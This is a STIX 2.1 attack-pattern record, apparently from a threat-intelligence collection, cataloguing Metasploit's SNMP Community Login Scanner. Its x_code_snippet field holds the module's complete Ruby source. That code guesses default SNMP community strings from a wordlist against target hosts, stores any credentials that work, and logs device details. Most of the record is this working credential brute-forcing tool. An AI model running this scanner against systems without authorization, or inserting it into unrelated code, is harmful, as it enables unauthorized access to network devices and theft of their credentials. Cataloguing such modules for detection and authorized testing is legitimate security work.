{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2bbdbb0f-469f-442e-b25d-5a38300b2032",
    "created": "2024-08-14T16:27:42.235836Z",
    "modified": "2024-08-14T16:27:42.23584Z",
    "name": "SNMP Community Login Scanner",
    "description": " This module logs in to SNMP devices using common community names. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/snmp/snmp_login.rb",
            "external_id": "snmp_login.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "1999-0508#Weakpassword"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'metasploit/framework/community_string_collection'\nrequire 'metasploit/framework/login_scanner/snmp'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::AuthBrute\n\n  def initialize\n    super(\n      'Name'        => 'SNMP Community Login Scanner',\n      'Description' => %q{\n        This module logs in to SNMP devices using common community names.\n      },\n      'Author'      => 'hdm',\n      'References'     =>\n        [\n          [ 'CVE', '1999-0508'] # Weak password\n        ],\n      'License'     => MSF_LICENSE\n    )\n\n    register_options(\n    [\n      Opt::RPORT(161),\n      OptEnum.new('VERSION', [true, 'The SNMP version to scan', '1', ['1', '2c', 'all']]),\n      OptString.new('PASSWORD', [ false, 'The password to test' ]),\n      OptPath.new('PASS_FILE',  [ false, \"File containing communities, one per line\",\n        File.join(Msf::Config.data_directory, \"wordlists\", \"snmp_default_pass.txt\")\n      ])\n    ])\n\n    deregister_options('USERNAME', 'USER_FILE', 'USERPASS_FILE', 'PASSWORD_SPRAY')\n  end\n\n  # Operate on a single host so that we can take advantage of multithreading\n  def run_host(ip)\n\n    collection = Metasploit::Framework::CommunityStringCollection.new(\n        pass_file: datastore['PASS_FILE'],\n        password: datastore['PASSWORD']\n    )\n\n    scanner = Metasploit::Framework::LoginScanner::SNMP.new(\n        host: ip,\n        port: rport,\n        cred_details: collection,\n        stop_on_success: datastore['STOP_ON_SUCCESS'],\n        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],\n        version: datastore['VERSION'],\n        framework: framework,\n        framework_module: self,\n        queue_size: 100\n    )\n\n    scanner.scan! do |result|\n      credential_data = result.to_h\n      credential_data.merge!(\n          module_fullname: self.fullname,\n          workspace_id: myworkspace_id\n      )\n      if result.success?\n        credential_core = create_credential(credential_data)\n        credential_data[:core] = credential_core\n        create_credential_login(credential_data)\n\n        print_good \"#{ip}:#{rport} - Login Successful: #{result.credential} (Access level: #{result.access_level}); Proof (sysDescr.0): #{result.proof}\"\n        report_service(\n          :host  => ip,\n          :port  => rport,\n          :proto => 'udp',\n          :name  => 'snmp',\n          :info  => result.proof,\n          :state => 'open'\n        )\n      else\n        invalidate_login(credential_data)\n        print_error \"#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status})\"\n      end\n    end\n  end\n\n  def rport\n    datastore['RPORT']\n  end\n\n\n\n\nend\n"
}